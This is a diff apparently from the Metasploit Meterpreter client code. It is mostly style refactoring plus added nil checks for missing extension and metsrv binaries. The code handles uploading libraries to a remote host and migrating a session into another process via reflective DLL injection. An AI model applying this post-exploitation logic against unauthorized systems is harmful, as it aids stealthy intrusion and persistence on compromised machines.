@@ -68,18 +68,18 @@ class ClientCore < Extension
     load_flags   = LOAD_LIBRARY_FLAG_LOCAL
 
     # No library path, no cookie.
-    if (library_path == nil)
+    if library_path.nil?
       raise ArgumentError, "No library file path was supplied", caller
     end
 
     # Set up the proper loading flags
-    if (opts['UploadLibrary'])
+    if opts['UploadLibrary']
       load_flags &= ~LOAD_LIBRARY_FLAG_LOCAL
     end
-    if (opts['SaveToDisk'])
+    if opts['SaveToDisk']
       load_flags |= LOAD_LIBRARY_FLAG_ON_DISK
     end
-    if (opts['Extension'])
+    if opts['Extension']
       load_flags |= LOAD_LIBRARY_FLAG_EXTENSION
     end
 
@@ -87,14 +87,14 @@ class ClientCore < Extension
     request = Packet.create_request('core_loadlib')
 
     # If we must upload the library, do so now
-    if ((load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL)
+    if (load_flags & LOAD_LIBRARY_FLAG_LOCAL) != LOAD_LIBRARY_FLAG_LOCAL
       image = ''
 
       ::File.open(library_path, 'rb') { |f|
         image = f.read
       }
 
-      if (image != nil)
+      if !image.nil?
         request.add_tlv(TLV_TYPE_DATA, image, false, client.capabilities[:zlib])
       else
         raise RuntimeError, "Failed to serialize library #{library_path}.", caller
@@ -103,7 +103,7 @@ class ClientCore < Extension
       # If it's an extension we're dealing with, rename the library
       # path of the local and target so that it gets loaded with a random
       # name
-      if (opts['Extension'])
+      if opts['Extension']
         library_path = "ext" + rand(1000000).to_s + ".#{client.binary_suffix}"
         target_path  = library_path
       end
@@ -113,7 +113,7 @@ class ClientCore < Extension
     request.add_tlv(TLV_TYPE_LIBRARY_PATH, library_path)
     request.add_tlv(TLV_TYPE_FLAGS, load_flags)
 
-    if (target_path != nil)
+    if !target_path.nil?
       request.add_tlv(TLV_TYPE_TARGET_PATH, target_path)
     end
 
@@ -121,9 +121,9 @@ class ClientCore < Extension
     response = self.client.send_packet_wait_response(request, self.client.response_timeout)
 
     # No response?
-    if (response == nil)
+    if response.nil?
       raise RuntimeError, "No response was received to the core_loadlib request.", caller
-    elsif (response.result != 0)
+    elsif response.result != 0
       raise RuntimeError, "The core_loadlib request failed with result: #{response.result}.", caller
     end
 
@@ -147,7 +147,7 @@ class ClientCore < Extension
   #		memory on the remote machine
   #
   def use(mod, opts = { })
-    if (mod == nil)
+    if mod.nil?
       raise RuntimeError, "No modules were specified", caller
     end
     # Get us to the installation root and then into data/meterpreter, where
@@ -155,8 +155,12 @@ class ClientCore < Extension
     modname = "ext_server_#{mod.downcase}"
     path = MeterpreterBinaries.path(modname, client.binary_suffix)
 
-    if (opts['ExtensionPath'])
+    if opts['ExtensionPath']
       path = opts['ExtensionPath']
+    end
+
+    if path.nil?
+      raise RuntimeError, "No module of the name #{modname}.#{client.binary_suffix} found", caller
     end
 
     path = ::File.expand_path(path)
@@ -187,24 +191,24 @@ class ClientCore < Extension
 
     # Determine the architecture for the pid we are going to migrate into...
     client.sys.process.processes.each { | p |
-      if( p['pid'] == pid )
+      if p['pid'] == pid
         process = p
         break
       end
     }
 
     # We cant migrate into a process that does not exist.
-    if( process == nil )
+    if process.nil?
       raise RuntimeError, "Cannot migrate into non existent process", caller
     end
 
     # We cant migrate into a process that we are unable to open
-    if( process['arch'] == nil or process['arch'].empty? )
+    if process['arch'].nil? or process['arch'].empty?
       raise RuntimeError, "Cannot migrate into this process (insufficient privileges)", caller
     end
 
     # And we also cant migrate into our own current process...
-    if( process['pid'] == client.sys.process.getpid )
+    if process['pid'] == client.sys.process.getpid
       raise RuntimeError, "Cannot migrate into current process", caller
     end
 
@@ -213,10 +217,10 @@ class ClientCore < Extension
     c.include( ::Msf::Payload::Stager )
 
     # Include the appropriate reflective dll injection module for the target process architecture...
-    if( process['arch'] == ARCH_X86 )
+    if process['arch'] == ARCH_X86
       c.include( ::Msf::Payload::Windows::ReflectiveDllInject )
       binary_suffix = "x86.dll"
-    elsif( process['arch'] == ARCH_X86_64 )
+    elsif process['arch'] == ARCH_X86_64
       c.include( ::Msf::Payload::Windows::ReflectiveDllInject_x64 )
       binary_suffix = "x64.dll"
     else
@@ -225,7 +229,12 @@ class ClientCore < Extension
 
     # Create the migrate stager
     migrate_stager = c.new()
-    migrate_stager.datastore['DLL'] = MeterpreterBinaries.path('metsrv',binary_suffix)
+
+    dll = MeterpreterBinaries.path('metsrv',binary_suffix)
+    if dll.nil?
+      raise RuntimeError, "metsrv.#{binary_suffix} not found", caller
+    end
+    migrate_stager.datastore['DLL'] = dll
 
     blob = migrate_stager.stage_payload
 
@@ -253,7 +262,7 @@ class ClientCore < Extension
     request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
     request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
     request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
-    if( process['arch'] == ARCH_X86_64 )
+    if process['arch'] == ARCH_X86_64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
@@ -301,7 +310,7 @@ class ClientCore < Extension
     # Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
     # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
     # If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
-    if( process['arch'] == ARCH_X86_64 )
+    if process['arch'] == ARCH_X86_64
       client.platform      = 'x64/win64'
       client.binary_suffix = 'x64.dll'
     else
